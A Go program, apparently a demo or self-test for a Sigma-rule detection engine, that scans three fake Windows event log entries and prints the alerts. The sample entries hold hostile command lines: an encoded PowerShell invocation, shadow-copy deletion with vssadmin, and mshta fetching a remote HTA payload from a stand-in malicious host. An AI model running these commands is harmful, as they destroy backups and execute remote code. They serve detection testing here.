package main

import (
	"fmt"
	"os"

	"github.com/user/vhd-opener/internal/sigma"
	"github.com/user/vhd-opener/internal/timeline"
)

func main() {
	engine := sigma.NewEngine()
	engine.AddEmbeddedDefaults()

	ruleCount := len(engine.Rules)
	fmt.Printf("Loaded %d embedded Sigma rules.\n", ruleCount)

	if len(os.Args) > 1 {
		ruleDir := os.Args[1]
		count, err := engine.LoadRulesFromDir(ruleDir)
		if err != nil {
			fmt.Printf("Error loading rules from %s: %v\n", ruleDir, err)
		} else {
			fmt.Printf("Loaded %d additional rules from %s.\n", count, ruleDir)
			ruleCount = len(engine.Rules)
		}
	}

	fmt.Printf("Total active rules: %d\n\n", ruleCount)

	sampleLogs := []timeline.TimelineEntry{
		{
			Source:    timeline.SourceEVTX,
			Title:     "Script Block Executed",
			EventType: timeline.EventProcessCreated,
			Path:      "C:\\Logs\\PowerShell.evtx",
			Description: "powershell.exe -e aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",
		},
		{
			Source:    timeline.SourceEVTX,
			Title:     "Process Creation",
			EventType: timeline.EventProcessCreated,
			Path:      "C:\\Logs\\System.evtx",
			Description: "vssadmin.exe delete shadows /all /quiet",
		},
		{
			Source:    timeline.SourceEVTX,
			Title:     "Process Creation",
			EventType: timeline.EventProcessCreated,
			Path:      "C:\\Logs\\Security.evtx",
			Description: "mshta.exe http://malicious.com/payload.hta",
		},
	}

	results := engine.ScanTimeline(sampleLogs)

	fmt.Printf("Scanned %d log entries, triggered %d alerts.\n\n", len(sampleLogs), len(results))

	for i, alert := range results {
		fmt.Printf("[%d] %s\n", i+1, alert.RuleTitle)
		fmt.Printf("    Level:       %s\n", alert.Level)
		fmt.Printf("    Description: %s\n", alert.Description)
		fmt.Printf("    Matched:     %s\n", alert.MatchedLog)
		fmt.Printf("    Tags:        %v\n\n", alert.Tags)
	}

	if len(results) > 0 {
		fmt.Println("SUCCESS: Sigma detection engine is operational.")
	} else {
		fmt.Println("WARNING: No alerts triggered. Check rule definitions.")
	}
}
